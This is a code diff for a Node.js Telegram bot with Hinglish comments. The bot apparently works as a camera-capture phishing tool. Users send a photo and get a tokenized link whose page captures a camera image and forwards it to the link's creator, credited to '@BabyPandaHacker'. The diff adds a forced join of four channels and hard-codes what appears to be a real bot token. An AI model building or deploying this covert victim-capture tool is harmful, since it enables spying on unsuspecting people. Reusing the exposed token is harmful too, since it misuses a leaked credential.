@@ -5,8 +5,19 @@ const { v4: uuidv4 } = require("uuid");
 const fs = require("fs");
 const path = require("path");
 
-const TOKEN = "8556524594:AAHmqFROoexxzEeXZHZs1U9b6cPVd_TOzZc"; // 🔴 YAHAN APNA REAL TOKEN DAALO
-const DOMAIN = "https://arrucambot.onrender.com"; // 🔴 Baad mein Render ka link yahan aayega
+// 🔴 APNA BOT TOKEN YAHAN DALO
+const TOKEN = "8556524594:AAHmqFROoexxzEeXZHZs1U9b6cPVd_TOzZc";
+
+// 🔴 TUMHARA RENDER LIVE LINK
+const DOMAIN = "https://arrucambot.onrender.com";
+
+// ✅ 4 MUST JOIN CHANNELS
+const FORCE_CHANNELS = [
+  "@fastmoneyloots",
+  "@ArruSmmPenal",
+  "@BabyPandaHack",
+  "@backup278847"
+];
 
 const bot = new TelegramBot(TOKEN, { polling: true });
 const app = express();
@@ -29,9 +40,75 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage });
 
-// ✅ Jab koi bot ko photo bheje
+// ✅ CHECK USER JOINED ALL CHANNELS OR NOT
+async function isUserJoinedAllChannels(userId) {
+  for (const channel of FORCE_CHANNELS) {
+    try {
+      const member = await bot.getChatMember(channel, userId);
+      if (member.status === "left") return false;
+    } catch (e) {
+      return false;
+    }
+  }
+  return true;
+}
+
+// ✅ /start COMMAND
+bot.onText(/\/start/, async (msg) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  const joined = await isUserJoinedAllChannels(userId);
+
+  if (!joined) {
+    const buttons = FORCE_CHANNELS.map(ch => ([{
+      text: `Join ${ch}`,
+      url: `https://t.me/${ch.replace("@", "")}`
+    }]));
+
+    buttons.push([{ text: "✅ Done Joined", callback_data: "check_join" }]);
+
+    bot.sendMessage(
+      chatId,
+      "🚨 All channel join kro warna bot work nhi krega!",
+      {
+        reply_markup: {
+          inline_keyboard: buttons
+        }
+      }
+    );
+  } else {
+    bot.sendMessage(chatId, "✅ Access granted! Ab koi bhi image bhejo.");
+  }
+});
+
+// ✅ BUTTON CHECK (DONE JOINED)
+bot.on("callback_query", async (query) => {
+  const userId = query.from.id;
+  const chatId = query.message.chat.id;
+
+  if (query.data === "check_join") {
+    const joined = await isUserJoinedAllChannels(userId);
+
+    if (!joined) {
+      bot.sendMessage(chatId, "❌ Pehle sabhi channel join karo, tabhi bot work karega!");
+    } else {
+      bot.sendMessage(chatId, "✅ Sab channel join ho gaye! Ab image bhejo.");
+    }
+  }
+});
+
+// ✅ IMAGE → CAMERA LINK GENERATE
 bot.on("photo", async (msg) => {
   const chatId = msg.chat.id;
+  const userId = msg.from.id;
+
+  const joined = await isUserJoinedAllChannels(userId);
+
+  if (!joined) {
+    bot.sendMessage(chatId, "❌ All channel join kro warna bot work nhi krega! /start dabao");
+    return;
+  }
 
   const token = uuidv4();
   links[token] = chatId;
@@ -44,26 +121,26 @@ bot.on("photo", async (msg) => {
   );
 });
 
-// ✅ Camera page
+// ✅ CAMERA PAGE
 app.get("/capture/:token", (req, res) => {
   if (!links[req.params.token]) return res.send("Invalid link!");
   res.sendFile(path.join(__dirname, "public", "capture.html"));
 });
 
-// ✅ Image upload + Telegram pe wapas bhejna
+// ✅ IMAGE RECEIVE & SEND TO TELEGRAM
 app.post("/api/upload/:token", upload.single("photo"), async (req, res) => {
   const chatId = links[req.params.token];
   if (!chatId) return res.json({ error: "Invalid token" });
 
   await bot.sendPhoto(chatId, req.file.path, {
-    caption: "✅ Camera image mil gaya made by >> @BabyPandaHacker",
+    caption: "✅ Camera image mil gaya!\n\n👑 Made by >> @BabyPandaHacker"
   });
 
   delete links[req.params.token];
   res.json({ success: true });
 });
 
-// ✅ Server start
+// ✅ SERVER START
 app.listen(3000, () => {
   console.log("Server running on port 3000");
 });
